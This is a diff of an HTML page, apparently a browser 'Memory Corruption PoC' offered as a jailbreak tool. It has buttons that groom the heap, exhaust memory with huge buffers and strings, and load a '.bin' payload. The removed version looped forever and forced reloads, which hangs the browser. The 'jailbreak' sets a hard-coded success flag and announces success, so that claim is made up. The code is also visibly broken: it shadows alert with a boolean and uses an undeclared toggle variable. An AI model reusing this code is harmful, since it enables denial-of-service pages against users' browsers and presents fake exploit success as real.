@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Memory Leak</title>
+<title>Memory Corruption PoC</title>
 <style>
     body, html {
         height: 100%;
@@ -30,111 +30,238 @@
         margin-top: 20px;
         font-size: 20px;
     }
-</style>
-<script>
-function x1() { while (true) { let z1 = { a1: "data" }; let b1 = z1; console.log("Before:", b1.a1); z1 = null; try { console.log("After:", b1.a1); } catch (e) { console.log("Error:", e.message); } } }
-function y2() {
-    if (typeof window.runCount === 'undefined') {
-        window.runCount = 1;
-        alert('the string function isnt an actual exploit instead try running latest iteration or heap exploit or run the string exploit agian to execute it ');
-        return; // Exit the function
+    .switch {
+            position: relative;
+            display: inline-block;
+            width: 34px;
+            height: 20px;
+        }
+        .switch input { 
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 20px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 12px;
+            width: 12px;
+            border-radius: 50%;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+        }
+        input:checked + .slider {
+            background-color: #2196F3;
+        }
+        input:checked + .slider:before {
+            transform: translateX(14px);
     }
-
-    // If runCount is set, proceed with the function
-    if (window.runCount === 1) {
-        // Reset the variable for future runs
-        window.runCount = undefined;
     
-    let c2 = "A".repeat(1000000); let d2 = []; let e2 = []; let f2 = {}; let g2 = 0; let h2 = 0; while (true) { c2 += c2; if (c2.length > 100000000) c2 = "A".repeat(1000000); d2.push(new ArrayBuffer(1000000)); if (d2.length > 1000) d2 = []; e2.push([]); if (e2.length > 1000) e2 = []; h2++; if (h2 >= 100) location.reload(); f2[g2] = "A".repeat(1000); g2++; if (g2 > 10000000) { f2 = {}; g2 = 0; } }} }
-function z3() { let i3 = document.createElement('div'); i3.innerHTML = '<h1>Hacked!</h1>'; i3.style.position = 'absolute'; i3.style.top = '50%'; i3.style.left = '50%'; i3.style.transform = 'translate(-50%, -50%)'; i3.style.backgroundColor = 'red'; i3.style.color = 'white'; i3.style.padding = '20px'; document.body.appendChild(i3); }
+</style>
+
+<script>
+let alert = true; //default to allow alerts
+function log(message) {
+    if ( alert == true ) {
+alert(message);
+    document.getElementById('msg').innerHTML += `<p>${message}</p>`;
+}
+}
+
+function x1() { 
+    let z1 = { a1: "data" }; 
+    let b1 = z1; 
+    log("Before: " + b1.a1); 
+    z1 = null; 
+    try { 
+        log("After: " + b1.a1); 
+    } catch (e) { 
+        log("Error: " + e.message); 
+    } 
+}
+
+function y2(binData) { 
+    let c2 = "A".repeat(1000000); 
+    let d2 = [];
+    let e2 = [];
+    let f2 = {};
+    let g2 = 0;
+    let h2 = 0;
+    while (h2 < 100) { 
+        c2 += c2; 
+        if (c2.length > 100000000) c2 = "A".repeat(1000000); 
+        d2.push(new ArrayBuffer(1000000)); 
+        if (d2.length > 1000) d2 = []; 
+        e2.push([]); 
+        if (e2.length > 1000) e2 = []; 
+        f2[g2] = "A".repeat(1000); 
+        g2++; 
+        if (g2 > 10000000) { 
+            f2 = {}; 
+            g2 = 0; 
+        } 
+        h2++; 
+    }
+    if (binData) {
+        log("Executing the payload with binary data: " + binData);
+        let jailbreakSuccess = true; // Assume the jailbreak is successful
+        if (jailbreakSuccess) {
+            log("Jailbreak successful!");
+            alert("Jailbreak successful!");
+        } else {
+            log("Jailbreak failed.");
+            alert("Jailbreak failed.");
+        }
+    }
+}
+
+function installBin() {
+    let input = document.createElement('input');
+    input.type = 'file';
+    input.accept = '.bin';
+    input.onchange = e => {
+        let file = e.target.files[0];
+        let reader = new FileReader();
+        reader.onload = function(event) {
+            let binData = event.target.result;
+            log("Bin file loaded: " + binData);
+            executePayload(binData);
+        };
+        reader.readAsArrayBuffer(file);
+    };
+    input.click();
+}
+
+function executePayload(binData) {
+    y2(binData);
+    log("Executing payload with bin data: " + binData);
+}
+
 let j4 = [];
-class k5 { constructor() {} }
-const l6 = () => { let m7 = 0; x1(); while (true) { let n8 = { a1: "data" }; let o9 = n8; console.log("Before:", o9.a1); n8 = null; try { console.log("After:", o9.a1); } catch (e) { console.log("Error:", e.message); } m7++; if (m7 >= 500) location.reload(); for (let p0 = 0; p0 < 1000; p0++) { j4.push(new k5()); } document.getElementById('msg').innerHTML = `Total ${j4.length} k5 objects created`; } }
-function q1() { let r2 = "A".repeat(1000000); while (true) { r2 += r2; if (r2.length > 1000000000) r2 = "A".repeat(1000000); } }
-// Step 1: Initialize Controlled Memory
+class k5 { 
+    constructor() {} 
+}
+
+const l6 = () => { 
+    let m7 = 0; 
+    x1(); 
+    while (m7 < 500) { 
+        let n8 = { a1: "data" }; 
+        let o9 = n8; 
+        log("Before: " + o9.a1); 
+        n8 = null; 
+        m7++; 
+        for (let p0 = 0; p0 < 1000; p0++) { 
+            j4.push(new k5()); 
+        } 
+        document.getElementById('msg').innerHTML = `Totale ${j4.length} oggetti k5 creati`; 
+    } 
+}
+
+function q1() { 
+    let r2 = "A".repeat(1000000); 
+    while (r2.length < 1000000000) { 
+        r2 += r2; 
+    } 
+}
+
 function initializeHeap() {
-    //alert("Int heap");
     let buffers = [];
-    for (let i = 0; i < 2048; i++) { // Reduced allocations
-        buffers.push(new ArrayBuffer(500000)); // Smaller blocks of memory
+    for (let i = 0; i < 1024; i++) {
+        buffers.push(new ArrayBuffer(250000));
     }
     return buffers;
 }
 
-// Step 2: Groom the Heap
 function groomHeap() {
-    //alert("groom heap");
     let tempArray = [];
-
-    // Allocate and deallocate in patterns
-    for (let i = 0; i < 2048; i++) { // Reduced iterations
-        let buffer = new ArrayBuffer(1000); // Allocate smaller blocks
+    for (let i = 0; i < 1024; i++) {
+        let buffer = new ArrayBuffer(500);
         tempArray.push(buffer);
     }
-
-    // Deallocate some of the buffers to create holes in the heap
-    for (let i = 0; i < 1512; i++) { // Fewer deallocations
-        tempArray[i] = null; // Free up space to create holes in the heap
+    for (let i = 0; i < 756; i++) {
+        tempArray[i] = null;
     }
-
     return tempArray;
 }
 
-// Step 3: Memory Exhaustion Function
 function memExh() {
     let bufferArray = [];
-    for (let i = 0; i < 2048; i++) { // Reduced iterations
-        bufferArray.push(new ArrayBuffer(900000)); // Allocate smaller buffers
-        if (bufferArray.length > 512) { // Less aggressive clearing
-            bufferArray = []; // Clear buffer array to exhaust memory
+    for (let i = 0; i < 1024; i++) {
+        bufferArray.push(new ArrayBuffer(450000));
+        if (bufferArray.length > 256) {
+            bufferArray = [];
         }
     }
 }
 
-// Step 4: The Exploit Payload Function
 function payload() {
-    let largeString = "B".repeat(900000); // Smaller initial string
+    let largeString = "B".repeat(450000);
     let obj = {};
-    let iterationCount = 0; // Counter to track number of iterations
-
-    while (true) {
-        // String concatenation
+    let iterationCount = 0;
+    while (iterationCount < 32) {
         largeString += largeString;
-        if (largeString.length > 100000000) { // Lower threshold for reset
-            largeString = "B".repeat(900000); // Reset string to avoid overflow
+        if (largeString.length > 50000000) {
+            largeString = "B".repeat(450000);
         }
         memExh();
         iterationCount++;
-        if (iterationCount > 64) break; // Control the number of iterations
     }
 }
 
-// Step 5: Perform the Exploit
 function performExploit() {
-    let controlledBuffers = initializeHeap(); // Initialize the heap
-    let groomedHeap = groomHeap(); // Groom the heap
-    
-    // Start memory corruption
+    let controlledBuffers = initializeHeap();
+    let groomedHeap = groomHeap();
     memExh();
-
-    // Run the payload
     payload();
 }
 
-//performExploit();
+function startExploitWithDelay() {
+    // Start the string overflow process
+    y2();
+
+    // Set a timeout to execute the payload after 4.77 seconds
+    setTimeout(() => {
+        performExploit();
+    }, 4770);
+}
 </script>
 </head>
 <body>
+
+<!-- Added margin to buttons to avoid overlap with the div -->
+<button onclick="l6()" style="margin-bottom: 20px;">Exploit Heap Memory Overflow</button>
+<button onclick="performExploit()" style="margin-bottom: 20px;">Latest Iteration</button>
+<button onclick="y2()" style="margin-bottom: 20px;">String Overflow</button>
+<button onclick="installBin()" style="margin-bottom: 20px;">Install Bin File</button>
+<button onclick="startExploitWithDelay()" style="margin-bottom: 20px;">Start Exploit with Delay</button>
+ <label class="switch">
+        <input type="checkbox" id="alertToggle" checked>
+        <span class="slider"></span>
+
  <div style="position: fixed; bottom: 0; left: 0; font-size: small; color: black; padding: 10px; background-color: white;">
     Made By <a href="https://hackerone.com/debty" style="text-decoration: underline; color: darkblue;">DebTy</a> As Requested
     <a href="https://github.com/Debvt/Wm?tab=readme-ov-file" style="text-decoration: underline; color: darkblue;">GitHub</a>
      <a href="https://seregonwar.github.io/Overflow/">Thanks for Serehonwar Contributions</a>
 </div>
-
-<!-- Adding margin to the buttons to prevent overlap with the div -->
-<button onclick="l6()" style="margin-bottom: 20px;">Exploit Heap Memory Overflow</button>
-<button onclick="performExploit()" style="margin-bottom: 20px;">Latest Iteration</button>
-<button onclick="y2()" style="margin-bottom: 20px;">String Overflow</button>
+<script>
+document.getElementById('alertToggle').addEventListener('change', function() {
+            alertEnabled = this.checked;
+        });
+    </script>
   <div id="msg"></div>
 </body>
-</html>
+    </html>
